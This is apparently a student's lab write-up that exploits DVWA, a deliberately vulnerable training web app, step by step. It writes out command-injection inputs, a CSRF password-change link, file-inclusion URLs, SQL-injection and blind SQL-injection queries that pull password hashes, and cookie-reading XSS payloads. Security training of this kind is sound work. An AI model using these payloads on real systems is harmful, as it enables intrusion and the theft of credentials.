## 1 Command Injection

> Try to input something to find out the user of the web service on the OS, as well as the machines hostname via RCE.

Firstly, we view the source code, and could find that the backend just simply concat 'ping' & 'user_input':

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/1-src.png" alt="1-src" style="zoom:38%;" />

It would be easy for us to do the command injection then.

Since in Windows, `cmd1 & cmd2` means execute `cmd2` no matter what the consequence of the `cmd1` is, we can use `cmd2` to do something other than `ping`.

However, we should first change the char set from utf-8 to GB2312 to avoid some awkward problem.

- We can get both userName & hostName by input `1.0.0.1 & whoami`:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/1-both.png" alt="1-both" style="zoom:38%;" />

​		And we could get more info by using param `/all`:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/1-more.png" alt="1-more" style="zoom:38%;" />

- We can get single hostName by input `1.0.0.1 & hostname`:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/1-hostname.png" alt="1-hostname" style="zoom:38%;" />

But it is weird that there are some differences when doing command injection and execute commands in the cmd. Both `echo %username%` & `net user` can work properly in the cmd, but response unexpectly on the website:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/1-hostname.png" alt="1-hostname" style="zoom:38%;" />

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/1-netuser.png" alt="1-netuser" style="zoom:38%;" />

Whatever, the userName of current user is `seabee`, and the hostName is `laptop-2do7j028`.

## 2 CSRF(Cross-Site Request Forgery)

> You are supposed to make the current user change their own password, without them knowing about their actions.

![2-src](/Users/shen/Desktop/网安实践/labs/Lab3/img/2-src.png)

View the src, we could find that the backend just check:

- Wether 'Change' is set.
- Wether `password_new` === `password_conf`.

If so, the backend would automatically change current user's password...

We can prepare a page that looks pretty like the original one, but add a malicious link:

![2-pforge](/Users/shen/Desktop/网安实践/labs/Lab3/img/2-pforge.png)

When user click the hyper link, the browser would automatically send a GET Request with query params `password=helloworld & password_conf=helloworld & Change = wow`, which would change current user's password to 'helloworld'.

Be like (the link is hide behind "User Policy"):

![2-cheat](/Users/shen/Desktop/网安实践/labs/Lab3/img/2-cheat.png)

Before user click the hyper link, the records in TABLE user is:

![2-before](/Users/shen/Desktop/网安实践/labs/Lab3/img/2-before.png)

And after the user was cheated, the record of password of user 'admin' was changed, which is the same as the result of `md5("helloworld")`.

![2-after](/Users/shen/Desktop/网安实践/labs/Lab3/img/2-after.png)

## 3 File Inclusion

> You are supposed to read all five famous quotes from “../hackable/flags/fi.php” using only the file inclusion. You can achieve the goal through local file inclusion (LFI) or remote file inclusion (RFI).

Before doing the experiment, we should modify the config to enable 'allow_url_include':

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/3-modifyconfig.png" alt="3-modifyconfig" style="zoom:38%;" />

It can work properly then:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/3-enableNow.png" alt="3-enableNow" style="zoom:38%;" />

---

View the src code, it seems we can visit anything we want:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/3-src.png" alt="3-src" style="zoom:38%;" />

According to the tip, I just try to visit target file through URL `127.0.0.1/DVWA/vulnerabilities/fi/?page=../../hackable/flags/fi.php`, and get quotes 1,2,5 then:

![3-1-gotthree](/Users/shen/Desktop/网安实践/labs/Lab3/img/3-1-gotthree.png)

As it is a good hobby to view the src of the page, we can easily find quote 5 with the help of Dev-Tool:

![3-2-got5th](/Users/shen/Desktop/网安实践/labs/Lab3/img/3-2-got5th.png)

But the 3^rd^ still seems impossible to be found, I just have a peek on the original `.php` file:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/3-3-peeksrc.png" alt="3-3-peeksrc" style="zoom:38%;" />

The original quote was covered by the second assignment statement. If we want to view the quote on the site, we should somehow prevent the code from being executed.

`php://filter/read=convert.base64-encode/recource=[file];` enables us to read the base64-encoded result of the original file withou getting executed. By accessing `http://127.0.0.1/DVWA/vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=../../hackable/flags/fi.php`, we could get the encoded result:

![3-4-gotbase64](/Users/shen/Desktop/网安实践/labs/Lab3/img/3-4-gotbase64.png)

Decode it, then we can read the 3^rd^ quote now:

![3-5-got3](/Users/shen/Desktop/网安实践/labs/Lab3/img/3-5-got3.png)

---

Besides, when we try to visit an inexistent file, we can find the absolute path:

![3-6-getpath](/Users/shen/Desktop/网安实践/labs/Lab3/img/3-6-getpath.png)

Visit the file by absolute path also works:

![3-7-absolute](/Users/shen/Desktop/网安实践/labs/Lab3/img/3-7-absolute.png)

---

And as the website shows file 1~3 to us, I tried to visit file4, and it works(I'm just trying to visit an inexistent file orz):

![3-guessF4](/Users/shen/Desktop/网安实践/labs/Lab3/img/3-guessF4.png)

## 4 File Upload

> You are supposed to execute any PHP function you choose on the target system.

1. Prepare `hello.php` first:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/4-hello.png" alt="4-hello" style="zoom:38%;" />

2. Upload it to the site, we could got the relative path:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/4-upload.png" alt="4-upload" style="zoom:38%;" />

3. So why don't we have a visit?

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/4-path.png" alt="4-path" style="zoom:38%;" />

4. The message is displayed:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/4-res.png" alt="4-res" style="zoom:38%;" />

## 5 SQL Injection

> You are supposed to steal 5 users’ passwords in the database through SQL injection.

View the src, the query sentence just concat 'id' to the given place:

![5-src](/Users/shen/Desktop/网安实践/labs/Lab3/img/5-src.png)

We can see the tableName 'user', but the columnNames are still unkown, try to figure out.

Column names could be read from schema, and with 'union' we can make the extra info be returned with the normal query result. Input `1' union select database(), group_concat(column_name) from information_schema.columns where table_schema='root' and table_name='users' #`, and we can see the following result:

![5-getcolname](/Users/shen/Desktop/网安实践/labs/Lab3/img/5-getcolname.png)

From the second record, we can find there is a column called 'password', that must be what we need.

Input `1' union select first_name, password as last_name from users #`, we can get the encrypted password:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/5-res.png" alt="5-res" style="zoom:38%;" />

The decrypt result is as follows (the password of 'admin' has been changed in the previous step):

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/5-plaintext.png" alt="5-plaintext" style="zoom:60%;" />

## 6 SQL Injection (Blind)

> You are supposed to steal 5 users’ passwords in the database through SQL injection (blind). You can achieve the goal through boolean-based SQL injection or time-based SQL injection.

1. Judge the type of the injection

   - Input `1` 
     Return `exists`
   - Input `1' and 1=1 #` 
     Return `exists`
   - Input `1' and 1=2 #`
     Return `MISSING`

   Thus, it's a char type injection.

2. Find the length of the database_name

   1. Input `1' and length(database())>8`, return `MISSING`.
      <img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/6-gtt8.png" alt="6-gtt8" style="zoom:38%;" />
   2. Input `1' and length(database())>4`, return `MISSING`.
   3. Input `1' and length(database())>2`, return `exists`.
   4. Input `1' and length(database())>3`, return `exists`.

   Thus, the length of database_name is 4.

3. Find the name of database.
   As we have already know the length of the db_name, we can determine the chars one by one, take the first character for example:

   - `1' and ascii(substr(databse(),1,1))>96`, return `exists`.
   - `1' and ascii(substr(databse(),1,1))<123`, return `exists`.

   Thus, we can determine that $1^{st} \ char \in [a-z]$, by applying dichotomy, we find it equals to 'd'. And it's the same for the rest 3 chars.
   We can find that `db_name = 'dvwa'` at the end.

4. Find the total number of tables in db 'dvwa'.

   - Input `1' and (select count(table_name) from information_schema.tables where table_schema=database())>4`, return `MISSING`.
   - Input `1' and (select count(table_name) from information_schema.tables where table_schema=database())>2`, return `MISSING`.
   - Input `1' and (select count(table_name) from information_schema.tables where table_schema=database())>1`, return `exists`.

   Therefore, there are 2 tables in db 'dvwa'.

5. Find the length of each table_name.
   Take the 1^st^ table for example:

   - Input `1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))>8`, return `exists`.
   - Input `1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))>10`, return `MISSING`.

   Thus, len(table_name_1) = 9. And it's the same for table 2.

   We can find the length of table_names are 9 and 4, respectively.

6. Find the names of each table.
   Take the 1^st^ char of the 1^st^ table_name for example:

   - Input `1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))>96`, return `exists`.
   - Input `1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))>123`, return `MISSING`.

   When input `1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))=123`, return `exsists`.

   Thus, the 1^st^ char of the 1^st^ table_name is 'g'.

   Follow the same process, we can find the table_names are 'guestbook' and 'users'.

7. Find the number of columns in table 'user'.

   - Input `1' and (select count(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')>8`, return `MISSING`.
   - Input `1' and (select count(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')>4`, return `exists`.
   - Input `1' and (select count(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')>6`, return `exists`.
   - Input `1' and (select count(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')>7`, return `exists`.

   Thus, there are 8 columns in table 'user'.

8. Guess the name of column which store 'username' and 'password'.

   - A column that stores information of user name is often named as 'username/user_name/uname/u_name/user/name/...'
   - A column that stores information of password is often named as 'password/pass_word/pwd/pass/...'

   We can use following input to check that whether there exists a column which has the given name:

   `1' and (select count(*) from information_schema.columns where table_schema='dvwa' and table_name='users' and column_name=${given_name})=1`

   And it returns `exists` when we try 'user' & 'password', those are the name of columns which store the message we want.

9. Get the value of 'password'.

   1. Find the length of 'password' in line 1.

      - Input `1' and length(substr((select password from users limit 0,1),1))>10 #`, return `exists`.
      - Input `1' and length(substr((select password from users limit 0,1),1))>20 #`, return `exists`.
      - Input `1' and length(substr((select password from users limit 0,1),1))>40 #`, return `MISSING`.
      - Input `1' and length(substr((select password from users limit 0,1),1))>30 #`, return `exists`.
      - Input `1' and length(substr((select password from users limit 0,1),1))>35 #`, return `MISSING`.
      - Input `1' and length(substr((select password from users limit 0,1),1))>32 #`, return `MISSING`.
      - Input `1' and length(substr((select password from users limit 0,1),1))>31 #`, return `MISSING`.

      Thus, the length of password in line 1 is 32.

   2. Find each characters of password in line 1.
      For the 1^st^ char:

      - Input `1' and ascii(substr((select password from users limit 0,1),1,1))>88 #`, return `exists`
      - ...

      We can find the 1^st^ char is 'f', and we can do the same for the rest.

      For it costs too many times, I wrote a script to enumerate the password, and this is the output:

      ![6-getPws](/Users/shen/Desktop/网安实践/labs/Lab3/img/6-getPws.png)

## 7 Weak Session IDs

> View backend code and understand why these IDs can be predicted.

View the source code, we could find that:

- If it's a POST request.
  - If 'last_session_id' has NOT been set, simply set it as `0`.
  - If 'last_session_id' has been set, just make `last_sesson_id++` & set Cookie 'dvwaSession' = 'last_session_id'.
  
  Which makes the session ID pretty easy to be predicted.

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/7-src.png" alt="7-src" style="zoom:38%;" />

With the help of Wireshark, we could see the header of the packet:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/7-sessionID.png" alt="7-sessionID" style="zoom:38%;" />

And we can see the Cookie change as follows as we replay for once:

```text
Cookie:
dvwaSession = 1; security=low; PHPSESSID=820u@bga16032f15g7cj8fmo72
```

Clear local storage of Cookie, log out and construct payload as follows in Hackbar.

![7-replay](/Users/shen/Desktop/网安实践/labs/Lab3/img/7-replay.png)

We can skip Log In and visit the page directly.

## 8 XSS (DOM)

> Run your own JavaScript to get the cookie and explain how the attack works in the real scene.

Send a normal request, we can find backend just take the param 'default' without any filter.

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/8-1-url.png" alt="8-1-url" style="zoom:38%;" />

Try to attach some malicious code `default=<script>alert('Wow~You can REALLY dance~)</script>`'.

Since backend treat it as a new option, and insert it into the option list, we can see the MsgBox every time we visit this page then:

(Since script would stop the page from rendering, the background is blank and would be normal after click 'confirm')

![8-res](/Users/shen/Desktop/网安实践/labs/Lab3/img/8-res.png)

And we could try to steal user's Cookie by `default=<script>alert(document.cookie)</script>`:

![8-getCookie](/Users/shen/Desktop/网安实践/labs/Lab3/img/8-getCookie.png)

## 9 XSS (Reflected)

> Run your own JavaScript to get the cookie and explain how the attack works in the real scene.

Do something normal, and we could find the page just echoed our input.

![9-normal](/Users/shen/Desktop/网安实践/labs/Lab3/img/9-normal.png)

The source code just shows the same thing: backend simply attach out input to 'Hello' and present it on the screen.

![9-src](/Users/shen/Desktop/网安实践/labs/Lab3/img/9-src.png)

We can input some code like `<script>alert('Long time no see!')</script>`, the MsgBox shows after we click 'Submit' button:

![9-res](/Users/shen/Desktop/网安实践/labs/Lab3/img/9-res.png)

We can also get user Cookie by input `<script>alert(document.cookie)</script>`:![9-getCookie](/Users/shen/Desktop/网安实践/labs/Lab3/img/9-getCookie.png)

## 10 XSS (Stored)

> Run your own JavaScript to get the cookie and explain how the attack works in the real scene.

Source code shows that the backend directly  insert our input into the database.

![10-src](/Users/shen/Desktop/网安实践/labs/Lab3/img/10-src.png)

And when render the page, those input could be treat as 'code' but not 'plaintext'. We input those script to get user's Cookie:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/10-input.png" alt="10-input" style="zoom:38%;" />

`Cookie.PHPSESSID` is set as HTTPOnly, thus we can't read it for the first time:

<img src="/Users/shen/Desktop/网安实践/labs/Lab3/img/10-cookie.png" alt="10-cookie" style="zoom:38%;" />

After cancel the HTTPOnly choice, we can get both Cookies this time:

![10-canelHTTPOnly](/Users/shen/Desktop/网安实践/labs/Lab3/img/10-canelHTTPOnly.png)